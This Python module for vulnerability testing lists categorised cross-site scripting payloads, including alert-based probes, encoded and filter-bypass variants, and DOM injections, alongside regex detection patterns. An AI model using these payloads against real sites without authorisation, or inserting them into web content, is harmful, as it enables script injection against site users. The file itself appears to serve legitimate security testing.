"""
XSS Payloads for vulnerability testing
"""

# Basic XSS Payloads - Alert Box
BASIC_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert('test')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<svg onload=alert(1)>",
    "javascript:alert('XSS')",
    "javascript:alert(1)",
]

# Reflected XSS Payloads
REFLECTED_XSS_PAYLOADS = [
    "<script>alert('reflected')</script>",
    "<img src=x onerror=alert('reflected')>",
    "<svg onload=alert('reflected')>",
    "<iframe src=javascript:alert('reflected')></iframe>",
    "<body onload=alert('reflected')>",
    "<div onmouseover=alert('reflected')>hover me</div>",
]

# Stored XSS Payloads (for forms/databases)
STORED_XSS_PAYLOADS = [
    "<script>alert('stored')</script>",
    "<img src=x onerror=alert('stored')>",
    "<svg onload=alert('stored')>",
    "<iframe src=javascript:alert('stored')></iframe>",
    "<body onload=alert('stored')>",
]

# DOM-based XSS Payloads
DOM_XSS_PAYLOADS = [
    "#<script>alert('DOM')</script>",
    "#<img src=x onerror=alert('DOM')>",
    "#javascript:alert('DOM')",
    "<script>eval(location.hash.slice(1))</script>",
    "<script>document.write(location.hash.slice(1))</script>",
]

# Advanced XSS Payloads
ADVANCED_XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=\"alert('XSS with quotes')\">",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script\x20type=\"text/javascript\">alert('XSS');</script>",
    "<script>alert('XSS');</script\x0D\x0A",
]

# Event Handler XSS Payloads
EVENT_XSS_PAYLOADS = [
    "<img src=x onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onmouseover=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus></textarea>",
    "<select onfocus=alert('XSS')><option>1</option></select>",
]

# Encoded XSS Payloads
ENCODED_XSS_PAYLOADS = [
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    "\u003cscript\u003ealert('XSS')\u003c/script\u003e",
]

# Filter Bypass XSS Payloads
BYPASS_XSS_PAYLOADS = [
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "<scr\x00ipt>alert('XSS')</script>",
    "<script>alert('XSS')//",
    "<script>alert('XSS')/*",
    "<script>alert('XSS')</script\x00",
    "<script>alert('XSS')\x00</script>",
    "<img src=x onerror=alert('XSS')//",
    "<img src=x onerror=alert('XSS')/*",
]

# All XSS payloads combined
ALL_XSS_PAYLOADS = (
    BASIC_XSS_PAYLOADS +
    REFLECTED_XSS_PAYLOADS +
    STORED_XSS_PAYLOADS +
    DOM_XSS_PAYLOADS +
    ADVANCED_XSS_PAYLOADS +
    EVENT_XSS_PAYLOADS +
    ENCODED_XSS_PAYLOADS +
    BYPASS_XSS_PAYLOADS
)

def get_all_xss_payloads():
    """Get all XSS payloads combined"""
    return ALL_XSS_PAYLOADS

def get_xss_payloads_by_type(payload_type="all"):
    """Get XSS payloads by type"""
    payload_types = {
        "basic": BASIC_XSS_PAYLOADS,
        "reflected": REFLECTED_XSS_PAYLOADS,
        "stored": STORED_XSS_PAYLOADS,
        "dom": DOM_XSS_PAYLOADS,
        "advanced": ADVANCED_XSS_PAYLOADS,
        "event": EVENT_XSS_PAYLOADS,
        "encoded": ENCODED_XSS_PAYLOADS,
        "bypass": BYPASS_XSS_PAYLOADS,
        "all": ALL_XSS_PAYLOADS
    }
    return payload_types.get(payload_type.lower(), ALL_XSS_PAYLOADS)

# XSS Detection Patterns
XSS_INDICATORS = [
    r"<script[^>]*>.*?</script>",
    r"javascript:",
    r"on\w+\s*=",
    r"<iframe[^>]*src\s*=\s*[\"']javascript:",
    r"<object[^>]*>",
    r"<embed[^>]*>",
    r"eval\s*\(",
    r"document\.write\s*\(",
    r"document\.writeln\s*\(",
    r"innerHTML\s*=",
    r"outerHTML\s*=",
    r"document\.cookie",
    r"location\.hash",
    r"location\.search",
]

# Common XSS filter patterns to bypass
FILTER_PATTERNS = [
    r"<script[^>]*>",
    r"</script>",
    r"javascript:",
    r"on\w+\s*=",
    r"alert\s*\(",
    r"eval\s*\(",
]